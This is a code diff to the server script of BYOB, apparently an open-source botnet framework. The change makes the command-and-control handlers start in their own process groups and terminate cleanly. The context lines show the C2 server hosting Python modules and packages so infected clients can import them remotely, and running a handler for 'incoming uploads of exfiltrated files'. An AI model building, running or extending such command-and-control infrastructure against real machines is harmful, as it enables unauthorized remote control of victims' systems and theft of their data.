@@ -19,6 +19,7 @@ import datetime
 import threading
 import subprocess
 import collections
+import signal
 
 http_serv_mod = "SimpleHTTPServer"
 if sys.version_info[0] > 2:
@@ -132,13 +133,13 @@ def main():
     globals()['debug'] = options.debug
 
     # host Python packages on C2 port + 2 (for clients to remotely import)
-    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True, preexec_fn=os.setsid)
 
     # host BYOB modules on C2 port + 1 (for clients to remotely import)
-    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True, preexec_fn=os.setsid)
 
     # run simple HTTP POST request handler on C2 port + 3 to handle incoming uploads of exfiltrated files
-    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
+    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, int(options.port + 3)), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True, preexec_fn=os.setsid)
 
     # run C2
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
@@ -495,9 +496,9 @@ class C2():
         """
 
         # terminate handlers running on other ports
-        globals()['package_handler'].terminate()
-        globals()['module_handler'].terminate()
-        globals()['post_handler'].terminate()
+        os.killpg(os.getpgid(globals()['package_handler'].pid), signal.SIGTERM)
+        os.killpg(os.getpgid(globals()['module_handler'].pid), signal.SIGTERM)
+        os.killpg(os.getpgid(globals()['post_handler'].pid), signal.SIGTERM)
 
         # kill subprocesses (subprocess.Popen)
         for proc in self.child_procs.values():
